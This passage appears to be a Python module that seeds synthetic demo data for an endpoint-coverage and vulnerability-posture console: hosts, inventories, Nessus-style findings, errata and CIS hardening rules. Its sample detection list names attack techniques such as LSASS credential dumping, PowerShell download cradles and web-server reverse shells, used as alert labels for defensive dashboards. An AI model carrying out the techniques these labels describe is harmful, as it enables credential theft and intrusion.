"""Sample data for trying the console without a CrowdStrike tenant (DEMO=1, `./run.sh --demo`).

Runs only against its own database file (data/demo.db by default), never the real one. Everything goes through the
same code paths as real uploads: inventory versions, vulnerability scans, old EDR import, agent tags and the NIAM dump.
Deterministic (fixed random seed), so the numbers are the same every time."""
import hashlib
import json
import logging
import random
from datetime import datetime, timedelta, timezone

from . import db, inventory, legacy, niam, posture, sync, vulns

log = logging.getLogger("demo")
NOW = datetime.now(timezone.utc)


def ts(days_ago=0.0, hours_ago=0.0):
    return (NOW - timedelta(days=days_ago, hours=hours_ago)).strftime("%Y-%m-%dT%H:%M:%SZ")


def aid_for(*parts):
    return hashlib.md5("|".join(map(str, parts)).encode()).hexdigest()


# LOB, MSPs, IPv4 prefix, IPv6 prefix (or None), connection (NAT) IP, host prefix, domain
LOBS = [
    ("Retail Banking", "Branch, teller and core-banking servers", "retail-sec@corp.example", ["Wipro", "TCS"],
     "10.10", None, "203.0.113.10", "RB", "retail.corp"),
    ("Payments", "Card switch, UPI and settlement platforms", "payments-sec@corp.example", ["Infosys", "HCL"],
     "10.20", None, "203.0.113.20", "PAY", "pay.corp"),
    ("Network Core", "Routers, firewalls and network management servers", "noc@corp.example", ["Tech Mahindra"],
     "10.30", "2001:db8:30", "203.0.113.30", "NC", "noc.corp"),
]
NODE_TYPES = {"RB": ["Server", "Server", "Database", "Web", "App"], "PAY": ["App", "App", "Database", "Web", "Server"],
              "NC": ["Server", "Network Device", "Network Device", "Firewall", "Server"]}
OSES = [("Windows", "Windows Server 2019", "Windows Server 2019 Standard"), ("Windows", "Windows Server 2022", "Windows Server 2022 Datacenter"),
        ("Linux", "RHEL 8.8", "Red Hat Enterprise Linux 8.8"), ("Linux", "RHEL 9.2", "Red Hat Enterprise Linux 9.2"),
        ("Linux", "Ubuntu 22.04", "Ubuntu 22.04 LTS"), ("Windows", "Windows Server 2016", "Windows Server 2016 Standard")]
LEGACY_OSES = [("Windows", "Windows Server 2008 R2", "Microsoft Windows Server 2008 R2 Enterprise"), ("Linux", "CentOS 6.10", "CentOS Linux 6.10")]
NET_OSES = [("Linux", "Cisco IOS XE 17.3", "Cisco IOS XE 17.3"), ("Linux", "Junos 21.4", "Juniper Junos OS 21.4"),
            ("Linux", "FortiOS 7.2", "Fortinet FortiOS 7.2"), ("Linux", "Linux Appliance", "Linux Kernel 4.18 (appliance)")]
SENSORS = ["7.18.18103", "7.17.18008", "7.16.17710", "7.14.17203", "7.10.16303"]
PLUGINS = [
    ("156164", "Apache Log4Shell RCE detection (CVE-2021-44228)", "Critical", "tcp", "8443", "CVE-2021-44228", "Exploits are available"),
    ("168828", "OpenSSL 3.0.0 < 3.0.7 Multiple Vulnerabilities", "High", "tcp", "443", "CVE-2022-3602, CVE-2022-3786", "Exploits are available"),
    ("187315", "OpenSSH < 9.6 Terrapin Prefix Truncation", "Medium", "tcp", "22", "CVE-2023-48795", "Exploits are available"),
    ("97833", "MS17-010: Security Update for Microsoft Windows SMB Server (ETERNALBLUE)", "Critical", "tcp", "445", "CVE-2017-0144", "Exploits are available"),
    ("51192", "SSL Certificate Cannot Be Trusted", "Medium", "tcp", "443", "", "No known exploits are available"),
    ("57582", "SSL Self-Signed Certificate", "Medium", "tcp", "8443", "", "No known exploits are available"),
    ("104743", "TLS Version 1.0 Protocol Detection", "Medium", "tcp", "443", "", "No known exploits are available"),
    ("42873", "SSL Medium Strength Cipher Suites Supported (SWEET32)", "High", "tcp", "443", "CVE-2016-2183", "No known exploits are available"),
    ("58453", "Terminal Services Doesn't Use Network Level Authentication (NLA) Only", "Medium", "tcp", "3389", "", "No known exploits are available"),
    ("125313", "Microsoft RDP RCE (CVE-2019-0708) (BlueKeep)", "Critical", "tcp", "3389", "CVE-2019-0708", "Exploits are available"),
    ("10114", "ICMP Timestamp Request Remote Date Disclosure", "Low", "icmp", "0", "CVE-1999-0524", "No known exploits are available"),
    ("70658", "SSH Server CBC Mode Ciphers Enabled", "Low", "tcp", "22", "CVE-2008-5161", "No known exploits are available"),
    ("153953", "SSH Weak Key Exchange Algorithms Enabled", "Low", "tcp", "22", "", "No known exploits are available"),
    ("182873", "Apache Tomcat 9.0.0.M1 < 9.0.81 Multiple Vulnerabilities", "High", "tcp", "8080", "CVE-2023-44487", "Exploits are available"),
    ("171860", "Oracle Database Server Multiple Vulnerabilities (Jan 2023 CPU)", "High", "tcp", "1521", "CVE-2023-21829", "No known exploits are available"),
    ("166555", "Microsoft SQL Server Unsupported Version Detection", "Critical", "tcp", "1433", "", "No known exploits are available"),
    ("183966", "Cisco IOS XE Web UI Privilege Escalation (CVE-2023-20198)", "Critical", "tcp", "443", "CVE-2023-20198", "Exploits are available"),
    ("41028", "SNMP Agent Default Community Name (public)", "High", "udp", "161", "CVE-1999-0517", "Exploits are available"),
    ("45411", "SSL Certificate with Wrong Hostname", "Medium", "tcp", "443", "", "No known exploits are available"),
    ("11219", "Nessus SYN scanner", "Info", "tcp", "0", "", ""),
]


def _host(rng, aid, hostname, ip, conn_ip, os_, first_seen, last_seen, domain, site, sensor=None, connection_ip=None):
    """conn_ip is the public NAT (external) address; the connection IP is the agent's own interface IP, as in Falcon."""
    platform, ver, product = os_
    return {
        "device_id": aid, "cid": "demo0000000000000000000000000000", "hostname": hostname, "local_ip": ip, "external_ip": conn_ip,
        "connection_ip": connection_ip or ip, "default_gateway_ip": "", "mac_address": "00-50-56-%02x-%02x-%02x" % (rng.randrange(256), rng.randrange(256), rng.randrange(256)),
        "platform_name": platform, "os_version": ver, "os_product_name": product, "os_build": "", "kernel_version": "",
        "product_type_desc": "Server", "chassis_type_desc": "Virtual", "machine_domain": domain, "site_name": site, "ou": [],
        "agent_version": sensor or rng.choice(SENSORS), "containment_status": "normal", "reduced_functionality_mode": "no",
        "system_manufacturer": "VMware, Inc.", "system_product_name": "VMware Virtual Platform", "serial_number": "VMW-" + aid[:10].upper(),
        "last_login_user": rng.choice(["svc_app", "admin", "oracle", "root", "svc_batch"]), "tags": ["SensorGroupingTags/Prod"],
        "groups": [], "first_seen": first_seen, "last_seen": last_seen, "modified_timestamp": last_seen,
    }


def _parsed(headers, rows, filename):
    return {"headers": headers, "rows": [[("" if v is None else str(v)) for v in r] for r in rows], "header_row": 1,
            "filename": filename, "sheets": ["Sheet1"], "sheet": "Sheet1"}


def seed(c):
    if c.execute("SELECT 1 FROM hosts LIMIT 1").fetchone() or c.execute("SELECT 1 FROM lobs LIMIT 1").fetchone():
        return False
    rng = random.Random(7)
    seed_feasibility_rules(c)
    settings = db.get_settings(c)
    hosts, states, events, removed_meta = [], {}, [], {}
    inv_rows = {}          # lob name -> list of inventory rows
    old_edr = []           # rows for the old EDR import
    scan_ips = {}          # lob name -> IPs covered by vulnerability scans
    niam_rows = []
    nat_map = []           # (internal IP, public NAT IP, LOB) for the communication matrix
    os_by_ip = {}          # what Nessus plugin 11936 reports for each IP

    for li, (lob, desc, owner, msps, v4, v6, nat, pre, domain) in enumerate(LOBS):
        rows = inv_rows.setdefault(lob, [])
        pubs = []
        n_nodes = {"RB": 240, "PAY": 180, "NC": 140}[pre]
        for i in range(1, n_nodes + 1):
            msp = msps[i % len(msps)]
            use_v6 = bool(v6) and i % 5 in (1, 3)
            ip = f"{v6}::{i:x}" if use_v6 else f"{v4}.{i // 200}.{i % 200 + 10}"
            ntype = rng.choice(NODE_TYPES[pre])
            name = f"{pre}-{ntype[:3].upper()}-{i:03d}"
            if ntype in ("Network Device", "Firewall"):
                os_ = rng.choice(NET_OSES)
            else:
                os_ = rng.choice(LEGACY_OSES) if rng.random() < 0.08 else rng.choice(OSES)
            os_by_ip[ip] = os_[2]
            live = "Non Live" if rng.random() < 0.06 else "Live"
            feasible = "No" if ntype in ("Network Device", "Firewall") and rng.random() < 0.7 else ("No" if rng.random() < 0.04 else "Yes")
            r = rng.random()
            if feasible == "No" or live == "Non Live":
                state = "none" if r < 0.85 else "active"
            elif r < 0.66:
                state = "active"
            elif r < 0.74:
                state = "auto"        # removed > 90 days
            elif r < 0.77:
                state = "deleted"
            elif r < 0.79:
                state = "hidden"
            elif r < 0.84:
                state = "old"         # only in the old EDR export
            else:
                state = "none"
            if os_ in NET_OSES[:3]:
                state = "none"        # no Falcon sensor exists for a network OS
            claim = "Yes" if state in ("active", "auto", "deleted", "hidden", "old") else "No"
            if rng.random() < 0.06:
                claim = "No" if claim == "Yes" else "Yes"   # inventory mistakes
            # inventory cells written the way people type them: IPv6 upper-case / expanded, IPv4 with a port now and then
            ip_cell = ip
            if use_v6 and i % 3 == 0:
                ip_cell = ":".join(f"{int(p, 16):04X}" for p in (v6 + f":0:0:0:0:{i:x}").split(":"))
            elif not use_v6 and i % 37 == 0:
                ip_cell = f"{ip} (primary)"
            facing, pub = "", ""
            if ntype == "App" and i % 23 == 0:  # reachable only through carrier-grade NAT (100.64.0.0/10)
                facing, pub = "Yes", f"100.64.{li}.{i % 250 + 1}"
            elif ntype == "Web" and i % 3 == 0:  # internet-facing web tier behind a firewall NAT
                facing, pub = "Yes", f"198.51.100.{(li * 80 + i) % 250 + 1}"
                pubs.append(pub)
                os_by_ip[pub] = os_[2]
                nat_map.append((ip, pub, lob))
            os_cell = "" if rng.random() < 0.35 else os_[1]  # many sheets leave OS blank: CrowdStrike / the VA scan fill it
            rows.append([ip_cell, name, msp, ntype, domain, live, os_cell, feasible, claim,
                         rng.choice(["", "", "", "Prod", "DR site", "Decom planned Q4"]), f"APP-{rng.randrange(1000, 9999)}", facing, pub])
            if state == "none":
                # a second NIC of an agent whose hostname is only close to the inventory name: a possible match for review
                if not use_v6 and i % 29 == 0:
                    near = aid_for(lob, "near", i)
                    hosts.append(_host(rng, near, f"{name}1", ip, nat, os_, ts(rng.uniform(40, 300)), ts(0, 1), domain, lob,
                                       connection_ip=f"{v4}.210.{i % 200 + 1}"))
                    states[near] = ("active", "online")
                elif not use_v6 and i % 31 == 0:  # abc1 and abc2 both exist: ambiguous, must not be offered
                    for k in (1, 2):
                        amb = aid_for(lob, "amb", i, k)
                        hosts.append(_host(rng, amb, f"{name}{k}", ip if k == 1 else f"{v4}.211.{i % 200 + k}", nat, os_,
                                           ts(rng.uniform(40, 300)), ts(0, 1), domain, lob, connection_ip=f"{v4}.212.{i % 200 + k}"))
                        states[amb] = ("active", "online")
                continue
            aid = aid_for(lob, i)
            first = ts(rng.uniform(40, 700))
            if state == "active":
                online = rng.random() < 0.86
                last = ts(0, rng.uniform(0, 0.3)) if online else ts(rng.uniform(0.5, 25))
                if rng.random() < 0.07:      # installed recently
                    first = ts(rng.uniform(0, 28))
                hosts.append(_host(rng, aid, name, ip, nat, os_, first, last, domain, lob))
                states[aid] = ("active", "online" if online else "offline")
            elif state == "old":
                last = ts(rng.uniform(200, 480))
                old_edr.append([aid, name, ip, os_[1], rng.choice(SENSORS[2:]), first, last, domain])
            else:
                last = ts(rng.uniform(95, 260)) if state == "auto" else ts(rng.uniform(1, 20))
                hosts.append(_host(rng, aid, name, ip, nat, os_, first, last, domain, lob, sensor=rng.choice(SENSORS[2:])))
                states[aid] = ("hidden" if state == "hidden" else "removed", None)
                if state != "hidden":
                    removed_meta[aid] = ("auto_inactive" if state == "auto" else "deleted", ts(rng.uniform(0, 30)) if state == "deleted" else last)
            # a few duplicates (two agents on one machine) and reinstalls (older, removed agent on the same IP)
            if state == "active" and i % 41 == 0:
                dup = aid_for(lob, i, "dup")
                hosts.append(_host(rng, dup, name, ip, nat, os_, ts(rng.uniform(100, 300)), ts(rng.uniform(3, 20)), domain, lob))
                states[dup] = ("active", "offline")
            if state == "active" and i % 29 == 0:
                old = aid_for(lob, i, "old")
                hosts.append(_host(rng, old, name, ip, nat, os_, ts(rng.uniform(400, 700)), ts(rng.uniform(120, 300)), domain, lob))
                states[old] = ("removed", None)
                removed_meta[old] = ("auto_inactive", ts(rng.uniform(30, 200)))
        # agents in EDR that the inventory does not list ("EDR only")
        for j in range(1, 19):
            aid = aid_for(lob, "extra", j)
            ip = f"{v4}.9.{j + 10}"
            name = f"{pre}-NEW-{j:03d}"
            os_by_ip[ip] = rng.choice(OSES)[2]
            hosts.append(_host(rng, aid, name, ip, nat, next(o for o in OSES if o[2] == os_by_ip[ip]), ts(rng.uniform(1, 90)), ts(0, rng.uniform(0, 0.3)), domain, lob))
            states[aid] = ("active", "online" if rng.random() < 0.9 else "offline")
        # DMZ servers with a public address on their own interface (CrowdStrike sees it)
        for j in range(1, 4):
            aid = aid_for(lob, "dmz", j)
            hosts.append(_host(rng, aid, f"{pre}-DMZ-{j:02d}", f"203.0.113.{100 + li * 10 + j}", nat, rng.choice(OSES), ts(rng.uniform(30, 300)),
                               ts(0, rng.uniform(0, 0.3)), domain, lob))
            states[aid] = ("active", "online")
        scan_ips[lob] = pubs[: max(1, len(pubs) * 2 // 3)] + [r[0] for r in rows if rng.random() < 0.65] + [f"{v4}.9.{j + 10}" for j in range(1, 7)] + [f"{v4}.250.{k}" for k in range(1, 6)]
        if pre in ("NC", "PAY"):
            for k, r in enumerate(rows):
                if pre == "PAY" and k % 3:
                    continue
                niam_rows.append([r[0], f"NE-{pre}-{k + 1:05d}", r[1], r[3] if pre == "NC" else "Server",
                                  rng.choice(["Cisco", "Juniper", "Nokia", "Huawei"]) if pre == "NC" else "Dell", rng.choice(["Mumbai", "Delhi", "Chennai", "Pune"])])
    # unmapped agents (not in any LOB)
    for j in range(1, 26):
        aid = aid_for("unmapped", j)
        hosts.append(_host(rng, aid, f"CORP-WS-{j:04d}", f"172.16.{j // 250}.{j % 250 + 1}", "198.51.100.7", rng.choice(OSES),
                           ts(rng.uniform(5, 400)), ts(0, rng.uniform(0, 30)), "corp.local", "HQ"))
        states[aid] = ("active", "online" if rng.random() < 0.8 else "offline")

    # ---- hosts
    cols = sync.HOST_COLS + ["console_state", "online_state"]
    mapped = []
    for d in hosts:
        h = sync.map_host(d)
        h["console_state"], h["online_state"] = states[h["aid"]]
        mapped.append(h)
    now = db.now_iso()
    c.executemany(f"INSERT INTO hosts ({', '.join(cols)}, online_checked_at, db_first_synced, db_last_synced) VALUES "
                  f"({', '.join('?' * len(cols))}, ?, ?, ?)", [[h[k] for k in cols] + [now, now, now] for h in mapped])
    c.executemany("UPDATE hosts SET removal_type=?, removed_at=? WHERE aid=?", [(t, at, a) for a, (t, at) in removed_meta.items()])
    c.executemany("UPDATE hosts SET removal_type='hidden', removed_at=? WHERE aid=?", [(ts(rng.uniform(2, 40)), a) for a, s in states.items() if s[0] == "hidden"])
    c.executemany("""INSERT OR IGNORE INTO ip_history(aid, ip, ip_num, mac, kind, source, first_seen, last_seen) VALUES (?,?,?,?,'local','sync',?,?)""",
                  [(h["aid"], h["local_ip"], h["local_ip_num"], h["mac_address"], h["first_seen"], h["last_seen"]) for h in mapped])
    for h in mapped:
        events.append((h["aid"], h["first_seen"], "new", json.dumps({"hostname": h["hostname"], "ip": h["local_ip"], "first_seen": h["first_seen"]})))
        if h["aid"] in removed_meta:
            events.append((h["aid"], removed_meta[h["aid"]][1], "removed", json.dumps({"type": removed_meta[h["aid"]][0]})))
    c.executemany("INSERT INTO host_events(aid, ts, event, details) VALUES (?,?,?,?)", events)

    # ---- daily trend (60 days)
    active = sum(1 for s in states.values() if s[0] == "active")
    online = sum(1 for s in states.values() if s == ("active", "online"))
    c.executemany("""INSERT OR REPLACE INTO daily_stats(day, total, online, offline, unknown, stale_online, new_hosts, removed, hidden, captured_at)
                     VALUES (?,?,?,?,0,?,?,?,?,?)""",
                  [((NOW - timedelta(days=d)).strftime("%Y-%m-%d"), active - d // 4, online - d // 5 + rng.randrange(-6, 6),
                    active - online - d // 20 + rng.randrange(-4, 4), rng.randrange(0, 4), rng.randrange(0, 5), rng.randrange(0, 3),
                    rng.randrange(0, 2), ts(d)) for d in range(60, 0, -1)])
    started = ts(0, 0.4)
    c.execute("""INSERT INTO sync_runs(started_at, finished_at, status, mode, total, fetched, new, removed, restored, hidden, message)
                 VALUES (?,?,?,?,?,?,?,?,?,?,?)""", (started, ts(0, 0.39), "ok", "sample", active, len(mapped), len(mapped), 0, 0, 0,
                                                       "Sample data (no CrowdStrike connection)"))
    sync.compute_devices(c, settings)
    sync.detect_reinstalls(c, settings, emit_events=False)

    # ---- LOBs, MSPs and inventories (through the normal upload path)
    std = db.standard_template_id(c)
    headers = [lbl for _, lbl in inventory.config.INVENTORY_FIELDS] + ["Application ID", "Internet Facing", "Public IP"]
    mapping = {k: lbl for k, lbl in inventory.config.INVENTORY_FIELDS}
    lob_ids = {}
    for lob, desc, owner, msps, *_ in LOBS:
        lid = c.execute("INSERT INTO lobs(name, description, owner, created_at) VALUES (?,?,?,?)", (lob, desc, owner, now)).lastrowid
        lob_ids[lob] = lid
        for m in msps:
            c.execute("INSERT INTO msps(lob_id, name, contact, created_at) VALUES (?,?,?,?)", (lid, m, f"{m.lower().replace(' ', '')}-noc@partner.example", now))
        rows = inv_rows[lob]
        # v1 (older) then v2: a few nodes added / removed / changed, so History has something to show
        v1 = [r[:] for r in rows[: int(len(rows) * 0.93)]]
        for r in v1[::17]:
            r[8] = "No" if r[8] == "Yes" else "Yes"
        for version_rows, note, who in ((v1, "Initial inventory from MSP", "demo.user"), (rows, "Monthly refresh", "demo.user")):
            items, warnings = inventory.build_items(_parsed(headers, version_rows, f"{lob.replace(' ', '_')}_inventory.xlsx"), mapping, "ip")
            inventory.commit_version(c, lid, items, filename=f"{lob.replace(' ', '_')}_inventory.xlsx", note=note, uploaded_by=who,
                                     template_id=std, key_field="ip", mapping=mapping, warnings=warnings)
    inventory.refresh_matches(c)

    # ---- agent tags: half of the "EDR only" agents are tagged to their LOB
    for lob, _, _, msps, *_ in LOBS:
        tag_rows = [{"aid": aid_for(lob, "extra", j), "msp": msps[j % len(msps)]} for j in range(1, 10)]
        inventory.commit_tags(c, lob_ids[lob], tag_rows, "demo_tags.xlsx")

    # ---- old EDR inventory export
    ed_headers = ["Host ID", "Hostname", "Local IP", "OS Version", "Sensor Version", "First Seen", "Last Seen", "Domain"]
    ed_map = {"aid": "Host ID", "hostname": "Hostname", "local_ip": "Local IP", "os_version": "OS Version", "agent_version": "Sensor Version",
              "first_seen": "First Seen", "last_seen": "Last Seen", "machine_domain": "Domain"}
    ed_rows = old_edr + [[aid_for("old-live", k), h["hostname"], h["local_ip"], h["os_version"], "7.05.15000", h["first_seen"], h["last_seen"], ""]
                         for k, h in enumerate(mapped[:12])]
    ed = legacy.build(_parsed(ed_headers, ed_rows, "falcon_hosts_export_2024.xlsx"), ed_map)
    res = legacy.classify(c, ed)
    iid = c.execute("""INSERT INTO edr_imports(filename, note, uploaded_by, uploaded_at, rows, added, already_known, live_now, mapping)
                       VALUES (?,?,?,?,?,?,?,?,?)""", ("falcon_hosts_export_2024.xlsx", "Old console export", "demo.user", now, len(ed),
                                                       len(res["new"]), len(res["known"]), len(res["live_now"]), json.dumps(ed_map))).lastrowid
    kc = [k for k in legacy.KEYS if k != "aid"]
    c.executemany(f"""INSERT INTO hosts(aid, {', '.join(kc)}, hostname_norm, local_ip_num, console_state, removal_type, removed_at, source,
                      import_id, is_primary, raw, db_first_synced, db_last_synced)
                      VALUES (?,{','.join('?' * len(kc))},?,?,'removed','imported',?,'import',?,1,'{{}}',?,?)""",
                  [(h["aid"], *[h[k] for k in kc], db.norm_hostname(h["hostname"]), db.ip_to_num(h["local_ip"]), h["last_seen"] or now, iid, now, now)
                   for h in res["new"]])
    c.executemany("INSERT OR IGNORE INTO ip_history(aid, ip, ip_num, mac, kind, source, first_seen, last_seen) VALUES (?,?,?,'','local','import',?,?)",
                  [(h["aid"], h["local_ip"], db.ip_to_num(h["local_ip"]), h["first_seen"] or h["last_seen"], h["last_seen"]) for h in res["new"] if h["local_ip"]])
    inventory.refresh_matches(c)

    # ---- two vulnerability scans per LOB (older, then current: some findings fixed, some new)
    vh = ["S.No.", "IP Address", "Vulnerability Name", "Severity", "Protocol", "Port", "Synopsis", "Description", "Steps to Remediate",
          "Plugin Text", "See Also", "CVE", "Exploit Ease", "Plugin ID", "First Discovered", "Last Observed", "Vuln Publication Date",
          "Patch Publication Date", "Remarks"]
    vmap = vulns.suggest_mapping(vh)
    for lob, lid in lob_ids.items():
        per_ip = {}
        for ip in scan_ips[lob]:
            k = rng.choice([0, 1, 1, 2, 2, 3, 4, 6])
            per_ip[ip] = rng.sample(PLUGINS, k)
        for scan_no, days in ((1, 38), (2, 4)):
            out, n = [], 0
            for ip, plist in per_ip.items():
                osname = os_by_ip.get(db.canon_ip(ip) or ip) or rng.choice(["Linux Kernel 3.10 on CentOS Linux release 7", "Microsoft Windows 10 Enterprise",
                                                                           "Cisco IOS XE 17.3", "Linux Kernel 5.4 on Ubuntu 20.04"])
                os_by_ip.setdefault(db.canon_ip(ip) or ip, osname)
                n += 1
                out.append([n, ip, "OS Identification", "Info", "tcp", "0", "It is possible to guess the remote operating system.", "",
                            "", f"\nRemote operating system : {osname}\nConfidence level : 95\nMethod : SSH\n", "", "", "", "11936",
                            ts(days + 60)[:10], ts(days)[:10], "", "", ""])
                for p in plist:
                    if scan_no == 2 and rng.random() < 0.22:   # remediated before the second scan
                        continue
                    n += 1
                    out.append([n, ip, p[1], p[2], p[3], p[4], f"The remote host is affected by: {p[1]}.",
                                f"According to its self-reported version, the remote service is affected by {p[1]}.",
                                "Upgrade to the latest vendor-supported version or apply the vendor patch.", f"Plugin output for {ip}",
                                "https://www.tenable.com/plugins/nessus/" + p[0], p[5], p[6], p[0], ts(days + rng.uniform(0, 120))[:10],
                                ts(days)[:10], ts(rng.uniform(200, 900))[:10], ts(rng.uniform(150, 800))[:10], ""])
                if scan_no == 2 and rng.random() < 0.25:
                    p = rng.choice(PLUGINS)
                    n += 1
                    out.append([n, ip, p[1], p[2], p[3], p[4], "", "", "Apply the vendor patch.", "", "", p[5], p[6], p[0],
                                ts(days)[:10], ts(days)[:10], "", "", "New in this scan"])
            fnd, warn = vulns.build_findings(_parsed(vh, out, f"nessus_{lob.replace(' ', '_').lower()}_scan{scan_no}.xlsx"), vmap)
            vulns.commit(c, lid, fnd, warn, filename=f"nessus_{lob.replace(' ', '_').lower()}_scan{scan_no}.xlsx",
                         note=f"Nessus scan {scan_no}", uploaded_by="demo.user", mapping=vmap)

    # ---- NIAM dump (Host -> NE ID); a few IPs not in any inventory, IPv6 written in full
    niam_rows += [[f"10.40.0.{k}", f"NE-ORPHAN-{k:03d}", f"ORPHAN-{k:03d}", "Switch", "Cisco", "Mumbai"] for k in range(1, 16)]
    nh = ["Host", "NE ID", "NE Name", "NE Type", "Vendor", "Circle"]
    nodes, nwarn = niam.build(_parsed(nh, niam_rows, "niam_dump.xlsx"), niam.suggest_mapping(nh))
    niam.commit(c, nodes, filename="niam_dump.xlsx", note="NIAM export", uploaded_by="demo.user", mapping=niam.suggest_mapping(nh), warnings=nwarn)
    seed_matrix_and_sod(c, rng, nat_map)
    seed_detections_and_satellite(c, rng)
    sync.capture_daily_stats(c, settings)
    # sample targets loose enough that the scorecards show a spread of grades (real installs keep the strict defaults)
    for k, v in {"target_coverage": "62", "target_offline_pct": "10", "target_scan_coverage": "56", "target_max_critical": "40",
                 "target_max_risk_critical": "5"}.items():
        c.execute("INSERT OR REPLACE INTO settings(key, value) VALUES (?, ?)", (k, v))
    posture.refresh(c)
    backfill_scorecards(c, rng)
    log.info("sample data loaded: %d agents, %d LOBs", len(mapped) + len(res["new"]), len(lob_ids))
    return True


def backfill_scorecards(c, rng):
    """60 days of MSP history that trends toward today's numbers (coverage rising, criticals falling)."""
    today = db.rows(c, "SELECT * FROM msp_daily WHERE day=(SELECT MAX(day) FROM msp_daily)")
    rows = []
    for d in range(60, 0, -1):
        day = (NOW - timedelta(days=d)).strftime("%Y-%m-%d")
        f = d / 60
        for t in today:
            app = t["applicable"] or 0
            inst = max(0, min(app, round((t["installed"] or 0) - app * 0.10 * f + rng.uniform(-1, 1))))
            off = max(0, round((t["offline"] or 0) * (1 + 0.5 * f) + rng.uniform(-1, 1)))
            rows.append((day, t["lob_id"], t["msp_id"], t["nodes"], app, inst, max(0, inst - off), off, max(0, app - inst),
                         round(100.0 * inst / app, 1) if app else None, round((t["crit"] or 0) * (1 + 0.7 * f)),
                         round((t["high"] or 0) * (1 + 0.4 * f)), round((t["crit_high_no_edr"] or 0) * (1 + 0.5 * f)),
                         t["live_nodes"], round((t["scanned_recent"] or 0) * (1 - 0.35 * f)) if d < 38 else round((t["scanned_recent"] or 0) * 0.35),
                         round((t["never_scanned"] or 0) * (1 + 0.3 * f)), round((t["risk_critical"] or 0) * (1 + 0.6 * f)),
                         round((t["risk_high"] or 0) * (1 + 0.3 * f))))
    c.executemany("""INSERT OR REPLACE INTO msp_daily(day, lob_id, msp_id, nodes, applicable, installed, online, offline, pending, coverage,
                     crit, high, crit_high_no_edr, live_nodes, scanned_recent, never_scanned, risk_critical, risk_high)
                     VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)""", rows)


def seed_feasibility_rules(c):
    """No feasibility marks (everything decided automatically from the OS catalog and where agents are installed) and
    sensor builds tagged N / N-1 / N-2 the way the Sensor update policies API returns them."""
    c.execute("INSERT OR REPLACE INTO settings(key, value) VALUES ('feasibility_marks', ?)", (json.dumps({
        "lob": {}, "domain": {}, "node_type": {}, "os": {}}),))
    now = db.now_iso()
    rows = []
    for plat in ("windows", "linux", "mac"):
        for v, tag in zip(SENSORS[:3], ("n", "n-1", "n-2")):
            rows.append((plat, v, f"{v.split('.')[-1]}|{tag}|tagged|1", tag.upper(), "prod", now))
    c.executemany("INSERT INTO sensor_builds(platform, sensor_version, build, tag, stage, fetched_at) VALUES (?,?,?,?,?,?)", rows)
    c.execute("INSERT OR REPLACE INTO settings(key, value) VALUES ('sensor_support_fetched', ?)",
              (json.dumps({"at": now, "builds": len(rows), "kernels": 0, "kernel_error": None, "sample": True}),))


DETECTIONS = [
    ("Critical", "Ransomware behaviour: mass file encryption", "Impact", "Data Encrypted for Impact", "Process killed, file quarantined"),
    ("High", "Credential dumping via LSASS memory access", "Credential Access", "OS Credential Dumping", "Process blocked"),
    ("High", "Suspicious PowerShell download cradle", "Execution", "PowerShell", "Process killed"),
    ("Medium", "Lateral movement with PsExec", "Lateral Movement", "SMB/Windows Admin Shares", "Detected"),
    ("Medium", "Reverse shell spawned by web server", "Execution", "Unix Shell", "Detected"),
    ("Low", "Known hacking tool on disk", "Discovery", "Network Service Discovery", "File quarantined"),
    ("Informational", "Machine learning: low confidence malware", "Machine Learning", "Sensor-based ML", "Detected"),
]
ERRATA = [
    ("RHSA-2026:1041", "Important: kernel security update", "security", "Important", "CVE-2026-1123, CVE-2026-1188"),
    ("RHSA-2026:0877", "Critical: openssl security update", "security", "Critical", "CVE-2022-3602, CVE-2022-3786, CVE-2026-0551"),
    ("RHSA-2026:0968", "Important: openssh security update", "security", "Important", "CVE-2023-48795"),
    ("RHSA-2026:1015", "Critical: log4j security update", "security", "Critical", "CVE-2021-44228"),
    ("RHSA-2026:0921", "Moderate: glibc security update", "security", "Moderate", "CVE-2026-0712"),
    ("RHSA-2026:1102", "Important: sudo security update", "security", "Important", "CVE-2026-1301"),
    ("RHSA-2026:0790", "Low: curl security update", "security", "Low", "CVE-2026-0402"),
    ("RHBA-2026:0655", "systemd bug fix update", "bugfix", "", ""),
    ("RHEA-2026:0512", "python3 enhancement update", "enhancement", "", ""),
]


MBSS_RULES = [
    ("CIS 1.1.2 /tmp partition", "xccdf_rule_partition_for_tmp", "Ensure /tmp is a separate partition", "Medium",
     "Create a separate partition for /tmp, or mount tmpfs on /tmp with nodev,nosuid,noexec (systemctl enable tmp.mount)."),
    ("CIS 1.4.1 Bootloader", "xccdf_rule_grub2_password", "Set the boot loader password", "High",
     "grub2-setpassword; then grub2-mkconfig -o /boot/grub2/grub.cfg"),
    ("CIS 4.1.1 Auditing", "xccdf_rule_service_auditd_enabled", "Ensure auditd is installed and running", "High",
     "dnf install audit; systemctl --now enable auditd"),
    ("CIS 5.2.8 SSH", "xccdf_rule_sshd_disable_root_login", "Disable SSH root login", "High",
     "Set 'PermitRootLogin no' in /etc/ssh/sshd_config and restart sshd."),
    ("CIS 5.2.4 SSH", "xccdf_rule_sshd_set_max_auth_tries", "Set SSH MaxAuthTries to 4 or less", "Medium",
     "Set 'MaxAuthTries 4' in /etc/ssh/sshd_config and restart sshd."),
    ("CIS 5.4.1 Password policy", "xccdf_rule_accounts_password_minlen", "Minimum password length 14", "Medium",
     "Set minlen = 14 in /etc/security/pwquality.conf."),
    ("CIS 5.5.1 Password policy", "xccdf_rule_accounts_maximum_age", "Password expiration 365 days or less", "Medium",
     "Set PASS_MAX_DAYS 365 in /etc/login.defs; chage --maxdays 365 <user> for existing users."),
    ("CIS 3.4.1 Firewall", "xccdf_rule_service_firewalld_enabled", "Ensure firewalld is enabled", "Medium",
     "systemctl --now enable firewalld"),
    ("CIS 6.2.1 File permissions", "xccdf_rule_no_empty_passwords", "Ensure no accounts have empty passwords", "High",
     "passwd -l <user> for every account with an empty password field in /etc/shadow."),
    ("CIS 1.6.1 SELinux", "xccdf_rule_selinux_state", "Ensure SELinux is enforcing", "High",
     "Set SELINUX=enforcing in /etc/selinux/config and reboot."),
]

# MBSS rules that usually pass (the rest of the baseline), so each host report lists compliant points too
MBSS_PASSING = [
    ("CIS 1.1.2 /tmp partition", "xccdf_rule_mount_option_tmp_nodev", "Ensure nodev option set on /tmp", "Medium", "Add nodev to the /tmp mount options in /etc/fstab and remount."),
    ("CIS 1.1.2 /tmp partition", "xccdf_rule_mount_option_tmp_noexec", "Ensure noexec option set on /tmp", "Medium", "Add noexec to the /tmp mount options in /etc/fstab and remount."),
